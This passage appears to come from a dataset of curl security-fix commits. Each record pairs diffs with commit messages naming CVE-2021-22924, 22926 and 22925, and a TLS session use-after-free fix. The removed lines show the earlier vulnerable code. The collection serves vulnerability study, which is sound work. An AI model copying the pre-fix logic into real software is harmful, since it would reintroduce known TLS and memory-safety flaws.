    \   data->set.proxy_ssl.primary.ca_info_blob =\n     data->set.blobs[BLOB_CAINFO_PROXY];\n\
    +  data->set.proxy_ssl.primary.issuercert =\n+    data->set.str[STRING_SSL_ISSUERCERT_PROXY];\n\
    +  data->set.proxy_ssl.primary.issuercert_blob =\n+    data->set.blobs[BLOB_SSL_ISSUERCERT_PROXY];\n\
    \   data->set.proxy_ssl.CRLfile = data->set.str[STRING_SSL_CRLFILE_PROXY];\n-\
    \  data->set.proxy_ssl.issuercert = data->set.str[STRING_SSL_ISSUERCERT_PROXY];\n\
    \   data->set.proxy_ssl.cert_type = data->set.str[STRING_CERT_TYPE_PROXY];\n \
    \  data->set.proxy_ssl.key = data->set.str[STRING_KEY_PROXY];\n   data->set.proxy_ssl.key_type\
    \ = data->set.str[STRING_KEY_TYPE_PROXY];\n@@ -3798,7 +3803,6 @@ static CURLcode\
    \ create_conn(struct Curl_easy *data,\n   data->set.proxy_ssl.key_blob = data->set.blobs[BLOB_KEY_PROXY];\n\
    \ #endif\n   data->set.ssl.CRLfile = data->set.str[STRING_SSL_CRLFILE];\n-  data->set.ssl.issuercert\
    \ = data->set.str[STRING_SSL_ISSUERCERT];\n   data->set.ssl.cert_type = data->set.str[STRING_CERT_TYPE];\n\
    \   data->set.ssl.key = data->set.str[STRING_KEY];\n   data->set.ssl.key_type\
    \ = data->set.str[STRING_KEY_TYPE];\n@@ -3812,9 +3816,7 @@ static CURLcode create_conn(struct\
    \ Curl_easy *data,\n   data->set.proxy_ssl.password = data->set.str[STRING_TLSAUTH_PASSWORD_PROXY];\n\
    \ #endif\n #endif\n-\n   data->set.ssl.key_blob = data->set.blobs[BLOB_KEY];\n\
    -  data->set.ssl.issuercert_blob = data->set.blobs[BLOB_SSL_ISSUERCERT];\n \n\
    \   if(!Curl_clone_primary_ssl_config(&data->set.ssl.primary,\n              \
    \                       &conn->ssl_config)) {"
  - "--- a/lib/vtls/gtls.c\n+++ b/lib/vtls/gtls.c\n@@ -856,7 +856,7 @@ gtls_connect_step3(struct\
    \ Curl_easy *data,\n   if(!chainp) {\n     if(SSL_CONN_CONFIG(verifypeer) ||\n\
    \        SSL_CONN_CONFIG(verifyhost) ||\n-       SSL_SET_OPTION(issuercert)) {\n\
    +       SSL_CONN_CONFIG(issuercert)) {\n #ifdef HAVE_GNUTLS_SRP\n       if(SSL_SET_OPTION(authtype)\
    \ == CURL_TLSAUTH_SRP\n          && SSL_SET_OPTION(username) != NULL\n@@ -1040,21\
    \ +1040,21 @@ gtls_connect_step3(struct Curl_easy *data,\n        gnutls_x509_crt_t\
    \ format */\n     gnutls_x509_crt_import(x509_cert, chainp, GNUTLS_X509_FMT_DER);\n\
    \ \n-  if(SSL_SET_OPTION(issuercert)) {\n+  if(SSL_CONN_CONFIG(issuercert)) {\n\
    \     gnutls_x509_crt_init(&x509_issuer);\n-    issuerp = load_file(SSL_SET_OPTION(issuercert));\n\
    +    issuerp = load_file(SSL_CONN_CONFIG(issuercert));\n     gnutls_x509_crt_import(x509_issuer,\
    \ &issuerp, GNUTLS_X509_FMT_PEM);\n     rc = gnutls_x509_crt_check_issuer(x509_cert,\
    \ x509_issuer);\n     gnutls_x509_crt_deinit(x509_issuer);\n     unload_file(issuerp);\n\
    \     if(rc <= 0) {\n       failf(data, \"server certificate issuer check failed\
    \ (IssuerCert: %s)\",\n-            SSL_SET_OPTION(issuercert)?SSL_SET_OPTION(issuercert):\"\
    none\");\n+            SSL_CONN_CONFIG(issuercert)?SSL_CONN_CONFIG(issuercert):\"\
    none\");\n       gnutls_x509_crt_deinit(x509_cert);\n       return CURLE_SSL_ISSUER_ERROR;\n\
    \     }\n     infof(data, \"  server certificate issuer check OK (Issuer Cert:\
    \ %s)\",\n-          SSL_SET_OPTION(issuercert)?SSL_SET_OPTION(issuercert):\"\
    none\");\n+          SSL_CONN_CONFIG(issuercert)?SSL_CONN_CONFIG(issuercert):\"\
    none\");\n   }\n \n   size = sizeof(certname);"
  - "--- a/lib/vtls/nss.c\n+++ b/lib/vtls/nss.c\n@@ -2187,9 +2187,9 @@ static CURLcode\
    \ nss_do_connect(struct Curl_easy *data,\n   if(result)\n     goto error;\n \n\
    -  if(SSL_SET_OPTION(issuercert)) {\n+  if(SSL_CONN_CONFIG(issuercert)) {\n  \
    \   SECStatus ret = SECFailure;\n-    char *nickname = dup_nickname(data, SSL_SET_OPTION(issuercert));\n\
    +    char *nickname = dup_nickname(data, SSL_CONN_CONFIG(issuercert));\n     if(nickname)\
    \ {\n       /* we support only nicknames in case of issuercert for now */\n  \
    \     ret = check_issuer_cert(backend->handle, nickname);"
  - "--- a/lib/vtls/openssl.c\n+++ b/lib/vtls/openssl.c\n@@ -3903,10 +3903,10 @@ static\
    \ CURLcode servercert(struct Curl_easy *data,\n        deallocating the certificate.\
    \ */\n \n     /* e.g. match issuer name with provided issuer certificate */\n\
    -    if(SSL_SET_OPTION(issuercert) || SSL_SET_OPTION(issuercert_blob)) {\n-  \
    \    if(SSL_SET_OPTION(issuercert_blob))\n-        fp = BIO_new_mem_buf(SSL_SET_OPTION(issuercert_blob)->data,\n\
    -                             (int)SSL_SET_OPTION(issuercert_blob)->len);\n+ \
    \   if(SSL_CONN_CONFIG(issuercert) || SSL_CONN_CONFIG(issuercert_blob)) {\n+ \
    \     if(SSL_CONN_CONFIG(issuercert_blob))\n+        fp = BIO_new_mem_buf(SSL_CONN_CONFIG(issuercert_blob)->data,\n\
    +                             (int)SSL_CONN_CONFIG(issuercert_blob)->len);\n \
    \      else {\n         fp = BIO_new(BIO_s_file());\n         if(!fp) {\n@@ -3920,10\
    \ +3920,10 @@ static CURLcode servercert(struct Curl_easy *data,\n           return\
    \ CURLE_OUT_OF_MEMORY;\n         }\n \n-        if(BIO_read_filename(fp, SSL_SET_OPTION(issuercert))\
    \ <= 0) {\n+        if(BIO_read_filename(fp, SSL_CONN_CONFIG(issuercert)) <= 0)\
    \ {\n           if(strict)\n             failf(data, \"SSL: Unable to open issuer\
    \ cert (%s)\",\n-                  SSL_SET_OPTION(issuercert));\n+           \
    \       SSL_CONN_CONFIG(issuercert));\n           BIO_free(fp);\n           X509_free(backend->server_cert);\n\
    \           backend->server_cert = NULL;\n@@ -3935,7 +3935,7 @@ static CURLcode\
    \ servercert(struct Curl_easy *data,\n       if(!issuer) {\n         if(strict)\n\
    \           failf(data, \"SSL: Unable to read issuer cert (%s)\",\n-         \
    \       SSL_SET_OPTION(issuercert));\n+                SSL_CONN_CONFIG(issuercert));\n\
    \         BIO_free(fp);\n         X509_free(issuer);\n         X509_free(backend->server_cert);\n\
    @@ -3946,7 +3946,7 @@ static CURLcode servercert(struct Curl_easy *data,\n   \
    \    if(X509_check_issued(issuer, backend->server_cert) != X509_V_OK) {\n    \
    \     if(strict)\n           failf(data, \"SSL: Certificate issuer check failed\
    \ (%s)\",\n-                SSL_SET_OPTION(issuercert));\n+                SSL_CONN_CONFIG(issuercert));\n\
    \         BIO_free(fp);\n         X509_free(issuer);\n         X509_free(backend->server_cert);\n\
    @@ -3955,7 +3955,7 @@ static CURLcode servercert(struct Curl_easy *data,\n   \
    \    }\n \n       infof(data, \" SSL certificate issuer check ok (%s)\",\n-  \
    \          SSL_SET_OPTION(issuercert));\n+            SSL_CONN_CONFIG(issuercert));\n\
    \       BIO_free(fp);\n       X509_free(issuer);\n     }"
  - "--- a/lib/vtls/vtls.c\n+++ b/lib/vtls/vtls.c\n@@ -125,6 +125,16 @@ static bool\
    \ blobcmp(struct curl_blob *first, struct curl_blob *second)\n   return !memcmp(first->data,\
    \ second->data, first->len); /* same data */\n }\n \n+static bool safecmp(char\
    \ *a, char *b)\n+{\n+  if(a && b)\n+    return !strcmp(a, b);\n+  else if(!a &&\
    \ !b)\n+    return TRUE; /* match */\n+  return FALSE; /* no match */\n+}\n+\n\
    +\n bool\n Curl_ssl_config_matches(struct ssl_primary_config *data,\n        \
    \                 struct ssl_primary_config *needle)\n@@ -136,11 +146,13 @@ Curl_ssl_config_matches(struct\
    \ ssl_primary_config *data,\n      (data->verifystatus == needle->verifystatus)\
    \ &&\n      blobcmp(data->cert_blob, needle->cert_blob) &&\n      blobcmp(data->ca_info_blob,\
    \ needle->ca_info_blob) &&\n-     Curl_safe_strcasecompare(data->CApath, needle->CApath)\
    \ &&\n-     Curl_safe_strcasecompare(data->CAfile, needle->CAfile) &&\n-     Curl_safe_strcasecompare(data->clientcert,\
    \ needle->clientcert) &&\n-     Curl_safe_strcasecompare(data->random_file, needle->random_file)\
    \ &&\n-     Curl_safe_strcasecompare(data->egdsocket, needle->egdsocket) &&\n\
    +     blobcmp(data->issuercert_blob, needle->issuercert_blob) &&\n+     safecmp(data->CApath,\
    \ needle->CApath) &&\n+     safecmp(data->CAfile, needle->CAfile) &&\n+     safecmp(data->issuercert,\
    \ needle->issuercert) &&\n+     safecmp(data->clientcert, needle->clientcert)\
    \ &&\n+     safecmp(data->random_file, needle->random_file) &&\n+     safecmp(data->egdsocket,\
    \ needle->egdsocket) &&\n      Curl_safe_strcasecompare(data->cipher_list, needle->cipher_list)\
    \ &&\n      Curl_safe_strcasecompare(data->cipher_list13, needle->cipher_list13)\
    \ &&\n      Curl_safe_strcasecompare(data->curves, needle->curves) &&\n@@ -163,8\
    \ +175,10 @@ Curl_clone_primary_ssl_config(struct ssl_primary_config *source,\n\
    \ \n   CLONE_BLOB(cert_blob);\n   CLONE_BLOB(ca_info_blob);\n+  CLONE_BLOB(issuercert_blob);\n\
    \   CLONE_STRING(CApath);\n   CLONE_STRING(CAfile);\n+  CLONE_STRING(issuercert);\n\
    \   CLONE_STRING(clientcert);\n   CLONE_STRING(random_file);\n   CLONE_STRING(egdsocket);\n\
    @@ -180,6 +194,7 @@ void Curl_free_primary_ssl_config(struct ssl_primary_config\
    \ *sslc)\n {\n   Curl_safefree(sslc->CApath);\n   Curl_safefree(sslc->CAfile);\n\
    +  Curl_safefree(sslc->issuercert);\n   Curl_safefree(sslc->clientcert);\n   Curl_safefree(sslc->random_file);\n\
    \   Curl_safefree(sslc->egdsocket);\n@@ -188,6 +203,7 @@ void Curl_free_primary_ssl_config(struct\
    \ ssl_primary_config *sslc)\n   Curl_safefree(sslc->pinned_key);\n   Curl_safefree(sslc->cert_blob);\n\
    \   Curl_safefree(sslc->ca_info_blob);\n+  Curl_safefree(sslc->issuercert_blob);\n\
    \   Curl_safefree(sslc->curves);\n }\n "
  commit_message: 'vtls: fix connection reuse checks for issuer cert and case sensitivity


    CVE-2021-22924


    Reported-by: Harry Sintonen

    Bug: https://curl.se/docs/CVE-2021-22924.html'
  commit_sha: 5ea3145850ebff1dc2b13d17440300a01ca38161
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/vtls/sectransp.c\n+++ b/lib/vtls/sectransp.c\n@@ -32,6 +32,7 @@\n #include\
    \ \"curl_base64.h\"\n #include \"strtok.h\"\n #include \"multiif.h\"\n+#include\
    \ \"strcase.h\"\n \n #ifdef USE_SECTRANSP\n \n@@ -1869,24 +1870,28 @@ static CURLcode\
    \ sectransp_connect_step1(struct Curl_easy *data,\n     bool is_cert_file = (!is_cert_data)\
    \ && is_file(ssl_cert);\n     SecIdentityRef cert_and_key = NULL;\n \n-    /*\
    \ User wants to authenticate with a client cert. Look for it:\n-       If we detect\
    \ that this is a file on disk, then let's load it.\n-       Otherwise, assume\
    \ that the user wants to use an identity loaded\n-       from the Keychain. */\n\
    -    if(is_cert_file || is_cert_data) {\n+    /* User wants to authenticate with\
    \ a client cert. Look for it. Assume that\n+       the user wants to use an identity\
    \ loaded from the Keychain. If not, try\n+       it as a file on disk */\n+\n\
    +    if(!is_cert_data)\n+      err = CopyIdentityWithLabel(ssl_cert, &cert_and_key);\n\
    +    else\n+      err = !noErr;\n+    if((err != noErr) && (is_cert_file || is_cert_data))\
    \ {\n       if(!SSL_SET_OPTION(cert_type))\n-        infof(data, \"WARNING: SSL:\
    \ Certificate type not set, assuming \"\n-                    \"PKCS#12 format.\"\
    );\n-      else if(strncmp(SSL_SET_OPTION(cert_type), \"P12\",\n-        strlen(SSL_SET_OPTION(cert_type)))\
    \ != 0)\n-        infof(data, \"WARNING: SSL: The Security framework only supports\
    \ \"\n-                    \"loading identities that are in PKCS#12 format.\"\
    );\n+        infof(data, \"SSL: Certificate type not set, assuming \"\n+     \
    \         \"PKCS#12 format.\");\n+      else if(!strcasecompare(SSL_SET_OPTION(cert_type),\
    \ \"P12\")) {\n+        failf(data, \"SSL: The Security framework only supports\
    \ \"\n+              \"loading identities that are in PKCS#12 format.\");\n+ \
    \       return CURLE_SSL_CERTPROBLEM;\n+      }\n \n       err = CopyIdentityFromPKCS12File(ssl_cert,\
    \ ssl_cert_blob,\n-        SSL_SET_OPTION(key_passwd), &cert_and_key);\n+    \
    \                                   SSL_SET_OPTION(key_passwd),\n+           \
    \                            &cert_and_key);\n     }\n-    else\n-      err =\
    \ CopyIdentityWithLabel(ssl_cert, &cert_and_key);\n \n     if(err == noErr &&\
    \ cert_and_key) {\n       SecCertificateRef cert = NULL;"
  commit_message: 'sectransp: check for client certs by name first, then file


    CVE-2021-22926


    Bug: https://curl.se/docs/CVE-2021-22926.html


    Assisted-by: Daniel Gustafsson

    Reported-by: Harry Sintonen'
  commit_sha: fd9b40bf8dfd43edcbc0d254d613d95a11061c05
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/telnet.c\n+++ b/lib/telnet.c\n@@ -920,12 +920,17 @@ static void suboption(struct\
    \ Curl_easy *data)\n         size_t tmplen = (strlen(v->data) + 1);\n        \
    \ /* Add the variable only if it fits */\n         if(len + tmplen < (int)sizeof(temp)-6)\
    \ {\n-          if(sscanf(v->data, \"%127[^,],%127s\", varname, varval) == 2)\
    \ {\n-            msnprintf((char *)&temp[len], sizeof(temp) - len,\n-       \
    \               \"%c%s%c%s\", CURL_NEW_ENV_VAR, varname,\n-                  \
    \    CURL_NEW_ENV_VALUE, varval);\n-            len += tmplen;\n-          }\n\
    +          int rv;\n+          char sep[2] = \"\";\n+          varval[0] = 0;\n\
    +          rv = sscanf(v->data, \"%127[^,]%1[,]%127s\", varname, sep, varval);\n\
    +          if(rv == 1)\n+            len += msnprintf((char *)&temp[len], sizeof(temp)\
    \ - len,\n+                             \"%c%s\", CURL_NEW_ENV_VAR, varname);\n\
    +          else if(rv >= 2)\n+            len += msnprintf((char *)&temp[len],\
    \ sizeof(temp) - len,\n+                             \"%c%s%c%s\", CURL_NEW_ENV_VAR,\
    \ varname,\n+                             CURL_NEW_ENV_VALUE, varval);\n     \
    \    }\n       }\n       msnprintf((char *)&temp[len], sizeof(temp) - len,"
  commit_message: 'telnet: fix option parser to not send uninitialized contents


    CVS-2021-22925


    Reported-by: Red Hat Product Security

    Bug: https://curl.se/docs/CVE-2021-22925.html'
  commit_sha: 894f6ec730597eb243618d33cc84d71add8d6a8a
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/multi.c\n+++ b/lib/multi.c\n@@ -878,8 +878,10 @@ bool Curl_multiplex_wanted(const\
    \ struct Curl_multi *multi)\n void Curl_detach_connnection(struct Curl_easy *data)\n\
    \ {\n   struct connectdata *conn = data->conn;\n-  if(conn)\n+  if(conn) {\n \
    \    Curl_llist_remove(&conn->easyq, &data->conn_queue, NULL);\n+    Curl_ssl_detach_conn(data,\
    \ conn);\n+  }\n   data->conn = NULL;\n }\n \n@@ -898,6 +900,7 @@ void Curl_attach_connnection(struct\
    \ Curl_easy *data,\n                          &data->conn_queue);\n   if(conn->handler->attach)\n\
    \     conn->handler->attach(data, conn);\n+  Curl_ssl_associate_conn(data, conn);\n\
    \ }\n \n static int waitconnect_getsock(struct connectdata *conn,"
  - "--- a/lib/vtls/gskit.c\n+++ b/lib/vtls/gskit.c\n@@ -1304,7 +1304,9 @@ const struct\
    \ Curl_ssl Curl_ssl_gskit = {\n   Curl_none_set_engine_default,   /* set_engine_default\
    \ */\n   Curl_none_engines_list,         /* engines_list */\n   Curl_none_false_start,\
    \          /* false_start */\n-  NULL                            /* sha256sum\
    \ */\n+  NULL,                           /* sha256sum */\n+  NULL,           \
    \                /* associate_connection */\n+  NULL                         \
    \   /* disassociate_connection */\n };\n \n #endif /* USE_GSKIT */"
  - "--- a/lib/vtls/gtls.c\n+++ b/lib/vtls/gtls.c\n@@ -1656,7 +1656,9 @@ const struct\
    \ Curl_ssl Curl_ssl_gnutls = {\n   Curl_none_set_engine_default,  /* set_engine_default\
    \ */\n   Curl_none_engines_list,        /* engines_list */\n   Curl_none_false_start,\
    \         /* false_start */\n-  gtls_sha256sum                 /* sha256sum */\n\
    +  gtls_sha256sum,                /* sha256sum */\n+  NULL,                  \
    \        /* associate_connection */\n+  NULL                           /* disassociate_connection\
    \ */\n };\n \n #endif /* USE_GNUTLS */"
  - "--- a/lib/vtls/mbedtls.c\n+++ b/lib/vtls/mbedtls.c\n@@ -1093,7 +1093,9 @@ const\
    \ struct Curl_ssl Curl_ssl_mbedtls = {\n   Curl_none_set_engine_default,     /*\
    \ set_engine_default */\n   Curl_none_engines_list,           /* engines_list\
    \ */\n   Curl_none_false_start,            /* false_start */\n-  mbedtls_sha256sum\
    \                 /* sha256sum */\n+  mbedtls_sha256sum,                /* sha256sum\
    \ */\n+  NULL,                             /* associate_connection */\n+  NULL\
    \                              /* disassociate_connection */\n };\n \n #endif\
    \ /* USE_MBEDTLS */"
  - "--- a/lib/vtls/mesalink.c\n+++ b/lib/vtls/mesalink.c\n@@ -666,7 +666,9 @@ const\
    \ struct Curl_ssl Curl_ssl_mesalink = {\n   Curl_none_set_engine_default,  /*\
    \ set_engine_default */\n   Curl_none_engines_list,        /* engines_list */\n\
    \   Curl_none_false_start,         /* false_start */\n-  NULL                \
    \           /* sha256sum */\n+  NULL,                          /* sha256sum */\n\
    +  NULL,                          /* associate_connection */\n+  NULL        \
    \                   /* disassociate_connection */\n };\n \n #endif"
  - "--- a/lib/vtls/nss.c\n+++ b/lib/vtls/nss.c\n@@ -2465,7 +2465,9 @@ const struct\
    \ Curl_ssl Curl_ssl_nss = {\n   Curl_none_set_engine_default, /* set_engine_default\
    \ */\n   Curl_none_engines_list,       /* engines_list */\n   nss_false_start,\
    \              /* false_start */\n-  nss_sha256sum                 /* sha256sum\
    \ */\n+  nss_sha256sum,                /* sha256sum */\n+  NULL,             \
    \            /* associate_connection */\n+  NULL                          /* disassociate_connection\
    \ */\n };\n \n #endif /* USE_NSS */"
  - "--- a/lib/vtls/openssl.c\n+++ b/lib/vtls/openssl.c\n@@ -240,6 +240,10 @@ struct\
    \ ssl_backend_data {\n #endif\n };\n \n+static void ossl_associate_connection(struct\
    \ Curl_easy *data,\n+                                      struct connectdata\
    \ *conn,\n+                                      int sockindex);\n+\n /*\n  *\
    \ Number of bytes to read from the random number seed file. This must be\n  *\
    \ a finite value (because some entropy \"files\" like /dev/urandom have\n@@ -2581,6\
    \ +2585,7 @@ static CURLcode ossl_connect_step1(struct Curl_easy *data,\n   curl_socket_t\
    \ sockfd = conn->sock[sockindex];\n   struct ssl_connect_data *connssl = &conn->ssl[sockindex];\n\
    \   ctx_option_t ctx_options = 0;\n+  void *ssl_sessionid = NULL;\n \n #ifdef\
    \ SSL_CTRL_SET_TLSEXT_HOSTNAME\n   bool sni;\n@@ -3225,46 +3230,23 @@ static CURLcode\
    \ ossl_connect_step1(struct Curl_easy *data,\n   }\n #endif\n \n-  /* Check if\
    \ there's a cached ID we can/should use here! */\n-  if(SSL_SET_OPTION(primary.sessionid))\
    \ {\n-    void *ssl_sessionid = NULL;\n-    int data_idx = ossl_get_ssl_data_index();\n\
    -    int connectdata_idx = ossl_get_ssl_conn_index();\n-    int sockindex_idx\
    \ = ossl_get_ssl_sockindex_index();\n-    int proxy_idx = ossl_get_proxy_index();\n\
    -\n-    if(data_idx >= 0 && connectdata_idx >= 0 && sockindex_idx >= 0 &&\n- \
    \      proxy_idx >= 0) {\n-      /* Store the data needed for the \"new session\"\
    \ callback.\n-       * The sockindex is stored as a pointer to an array element.\
    \ */\n-      SSL_set_ex_data(backend->handle, data_idx, data);\n-      SSL_set_ex_data(backend->handle,\
    \ connectdata_idx, conn);\n-      SSL_set_ex_data(backend->handle, sockindex_idx,\
    \ conn->sock + sockindex);\n-#ifndef CURL_DISABLE_PROXY\n-      SSL_set_ex_data(backend->handle,\
    \ proxy_idx, SSL_IS_PROXY() ? (void *) 1:\n-                      NULL);\n-#else\n\
    -      SSL_set_ex_data(backend->handle, proxy_idx, NULL);\n-#endif\n-\n-    }\n\
    +  ossl_associate_connection(data, conn, sockindex);\n \n-    Curl_ssl_sessionid_lock(data);\n\
    -    if(!Curl_ssl_getsessionid(data, conn, SSL_IS_PROXY() ? TRUE : FALSE,\n- \
    \                             &ssl_sessionid, NULL, sockindex)) {\n-      /* we\
    \ got a session id, use it! */\n-      if(!SSL_set_session(backend->handle, ssl_sessionid))\
    \ {\n-        Curl_ssl_sessionid_unlock(data);\n-        failf(data, \"SSL: SSL_set_session\
    \ failed: %s\",\n-              ossl_strerror(ERR_get_error(), error_buffer,\n\
    -                            sizeof(error_buffer)));\n-        return CURLE_SSL_CONNECT_ERROR;\n\
    -      }\n-      /* Informational message */\n-      infof(data, \"SSL re-using\
    \ session ID\\n\");\n+  Curl_ssl_sessionid_lock(data);\n+  if(!Curl_ssl_getsessionid(data,\
    \ conn, SSL_IS_PROXY() ? TRUE : FALSE,\n+                            &ssl_sessionid,\
    \ NULL, sockindex)) {\n+    /* we got a session id, use it! */\n+    if(!SSL_set_session(backend->handle,\
    \ ssl_sessionid)) {\n+      Curl_ssl_sessionid_unlock(data);\n+      failf(data,\
    \ \"SSL: SSL_set_session failed: %s\",\n+            ossl_strerror(ERR_get_error(),\
    \ error_buffer,\n+                          sizeof(error_buffer)));\n+      return\
    \ CURLE_SSL_CONNECT_ERROR;\n     }\n-    Curl_ssl_sessionid_unlock(data);\n+ \
    \   /* Informational message */\n+    infof(data, \"SSL re-using session ID\\\
    n\");\n   }\n+  Curl_ssl_sessionid_unlock(data);\n \n #ifndef CURL_DISABLE_PROXY\n\
    \   if(conn->proxy_ssl[sockindex].use) {\n@@ -4498,6 +4480,90 @@ static void *ossl_get_internals(struct\
    \ ssl_connect_data *connssl,\n          (void *)backend->ctx : (void *)backend->handle;\n\
    \ }\n \n+static void ossl_associate_connection(struct Curl_easy *data,\n+    \
    \                                  struct connectdata *conn,\n+              \
    \                        int sockindex)\n+{\n+  struct ssl_connect_data *connssl\
    \ = &conn->ssl[sockindex];\n+  struct ssl_backend_data *backend = connssl->backend;\n\
    +\n+  /* If we don't have SSL context, do nothing. */\n+  if(!backend->handle)\n\
    +    return;\n+\n+  if(SSL_SET_OPTION(primary.sessionid)) {\n+    int data_idx\
    \ = ossl_get_ssl_data_index();\n+    int connectdata_idx = ossl_get_ssl_conn_index();\n\
    +    int sockindex_idx = ossl_get_ssl_sockindex_index();\n+    int proxy_idx =\
    \ ossl_get_proxy_index();\n+\n+    if(data_idx >= 0 && connectdata_idx >= 0 &&\
    \ sockindex_idx >= 0 &&\n+       proxy_idx >= 0) {\n+      /* Store the data needed\
    \ for the \"new session\" callback.\n+       * The sockindex is stored as a pointer\
    \ to an array element. */\n+      SSL_set_ex_data(backend->handle, data_idx, data);\n\
    +      SSL_set_ex_data(backend->handle, connectdata_idx, conn);\n+      SSL_set_ex_data(backend->handle,\
    \ sockindex_idx, conn->sock + sockindex);\n+#ifndef CURL_DISABLE_PROXY\n+    \
    \  SSL_set_ex_data(backend->handle, proxy_idx, SSL_IS_PROXY() ? (void *) 1:\n\
    +                      NULL);\n+#else\n+      SSL_set_ex_data(backend->handle,\
    \ proxy_idx, NULL);\n+#endif\n+    }\n+  }\n+}\n+\n+/*\n+ * Starting with TLS\
    \ 1.3, the ossl_new_session_cb callback gets called after\n+ * the handshake.\
    \ If the transfer that sets up the callback gets killed before\n+ * this callback\
    \ arrives, we must make sure to properly clear the data to\n+ * avoid UAF problems.\
    \ A future optimization could be to instead store another\n+ * transfer that might\
    \ still be using the same connection.\n+ */\n+\n+static void ossl_disassociate_connection(struct\
    \ Curl_easy *data,\n+                                         int sockindex)\n\
    +{\n+  struct connectdata *conn = data->conn;\n+  struct ssl_connect_data *connssl\
    \ = &conn->ssl[sockindex];\n+  struct ssl_backend_data *backend = connssl->backend;\n\
    +\n+  /* If we don't have SSL context, do nothing. */\n+  if(!backend->handle)\n\
    +    return;\n+\n+  if(SSL_SET_OPTION(primary.sessionid)) {\n+    bool isproxy\
    \ = FALSE;\n+    bool incache;\n+    void *old_ssl_sessionid = NULL;\n+    int\
    \ data_idx = ossl_get_ssl_data_index();\n+    int connectdata_idx = ossl_get_ssl_conn_index();\n\
    +    int sockindex_idx = ossl_get_ssl_sockindex_index();\n+    int proxy_idx =\
    \ ossl_get_proxy_index();\n+\n+    if(data_idx >= 0 && connectdata_idx >= 0 &&\
    \ sockindex_idx >= 0 &&\n+       proxy_idx >= 0) {\n+      /* Invalidate the session\
    \ cache entry, if any */\n+      isproxy = SSL_get_ex_data(backend->handle, proxy_idx)\
    \ ? TRUE : FALSE;\n+\n+      /* Disable references to data in \"new session\"\
    \ callback to avoid\n+       * accessing a stale pointer. */\n+      SSL_set_ex_data(backend->handle,\
    \ data_idx, NULL);\n+      SSL_set_ex_data(backend->handle, connectdata_idx, NULL);\n\
    +      SSL_set_ex_data(backend->handle, sockindex_idx, NULL);\n+      SSL_set_ex_data(backend->handle,\
    \ proxy_idx, NULL);\n+    }\n+\n+    Curl_ssl_sessionid_lock(data);\n+    incache\
    \ = !(Curl_ssl_getsessionid(data, conn, isproxy,\n+                          \
    \            &old_ssl_sessionid, NULL, sockindex));\n+    if(incache)\n+     \
    \ Curl_ssl_delsessionid(data, old_ssl_sessionid);\n+    Curl_ssl_sessionid_unlock(data);\n\
    +  }\n+}\n+\n const struct Curl_ssl Curl_ssl_openssl = {\n   { CURLSSLBACKEND_OPENSSL,\
    \ \"openssl\" }, /* info */\n \n@@ -4533,10 +4599,12 @@ const struct Curl_ssl\
    \ Curl_ssl_openssl = {\n   ossl_engines_list,        /* engines_list */\n   Curl_none_false_start,\
    \    /* false_start */\n #if (OPENSSL_VERSION_NUMBER >= 0x0090800fL) && !defined(OPENSSL_NO_SHA256)\n\
    -  ossl_sha256sum            /* sha256sum */\n+  ossl_sha256sum,           /*\
    \ sha256sum */\n #else\n-  NULL                      /* sha256sum */\n+  NULL,\
    \                     /* sha256sum */\n #endif\n+  ossl_associate_connection,\
    \ /* associate_connection */\n+  ossl_disassociate_connection /* disassociate_connection\
    \ */\n };\n \n #endif /* USE_OPENSSL */"
  - "--- a/lib/vtls/rustls.c\n+++ b/lib/vtls/rustls.c\n@@ -604,7 +604,9 @@ const struct\
    \ Curl_ssl Curl_ssl_rustls = {\n   Curl_none_set_engine_default,    /* set_engine_default\
    \ */\n   Curl_none_engines_list,          /* engines_list */\n   Curl_none_false_start,\
    \           /* false_start */\n-  NULL                             /* sha256sum\
    \ */\n+  NULL,                            /* sha256sum */\n+  NULL,          \
    \                  /* associate_connection */\n+  NULL                       \
    \      /* disassociate_connection */\n };\n \n #endif /* USE_RUSTLS */"
  - "--- a/lib/vtls/schannel.c\n+++ b/lib/vtls/schannel.c\n@@ -329,7 +329,7 @@ get_alg_id_by_name(char\
    \ *name)\n \n static CURLcode\n set_ssl_ciphers(SCHANNEL_CRED *schannel_cred,\
    \ char *ciphers,\n-                int *algIds)\n+                ALG_ID *algIds)\n\
    \ {\n   char *startCur = ciphers;\n   int algCount = 0;\n@@ -2433,7 +2433,9 @@\
    \ const struct Curl_ssl Curl_ssl_schannel = {\n   Curl_none_set_engine_default,\
    \      /* set_engine_default */\n   Curl_none_engines_list,            /* engines_list\
    \ */\n   Curl_none_false_start,             /* false_start */\n-  schannel_sha256sum\
    \                 /* sha256sum */\n+  schannel_sha256sum,                /* sha256sum\
    \ */\n+  NULL,                              /* associate_connection */\n+  NULL\
    \                               /* disassociate_connection */\n };\n \n #endif\
    \ /* USE_SCHANNEL */"
  - "--- a/lib/vtls/sectransp.c\n+++ b/lib/vtls/sectransp.c\n@@ -3453,6 +3453,8 @@\
    \ const struct Curl_ssl Curl_ssl_sectransp = {\n   Curl_none_engines_list,   \
    \          /* engines_list */\n   sectransp_false_start,              /* false_start\
    \ */\n   sectransp_sha256sum                 /* sha256sum */\n+  NULL,       \
    \                        /* associate_connection */\n+  NULL                 \
    \               /* disassociate_connection */\n };\n \n #ifdef __clang__"
  - "--- a/lib/vtls/vtls.c\n+++ b/lib/vtls/vtls.c\n@@ -586,6 +586,25 @@ CURLcode Curl_ssl_addsessionid(struct\
    \ Curl_easy *data,\n   return CURLE_OK;\n }\n \n+void Curl_ssl_associate_conn(struct\
    \ Curl_easy *data,\n+                             struct connectdata *conn)\n\
    +{\n+  if(Curl_ssl->associate_connection) {\n+    Curl_ssl->associate_connection(data,\
    \ conn, FIRSTSOCKET);\n+    if(conn->sock[SECONDARYSOCKET] && conn->bits.sock_accepted)\n\
    +      Curl_ssl->associate_connection(data, conn, SECONDARYSOCKET);\n+  }\n+}\n\
    +\n+void Curl_ssl_detach_conn(struct Curl_easy *data,\n+                     \
    \     struct connectdata *conn)\n+{\n+  if(Curl_ssl->disassociate_connection)\
    \ {\n+    Curl_ssl->disassociate_connection(data, FIRSTSOCKET);\n+    if(conn->sock[SECONDARYSOCKET]\
    \ && conn->bits.sock_accepted)\n+      Curl_ssl->disassociate_connection(data,\
    \ SECONDARYSOCKET);\n+  }\n+}\n \n void Curl_ssl_close_all(struct Curl_easy *data)\n\
    \ {\n@@ -1214,7 +1233,9 @@ static const struct Curl_ssl Curl_ssl_multi = {\n \
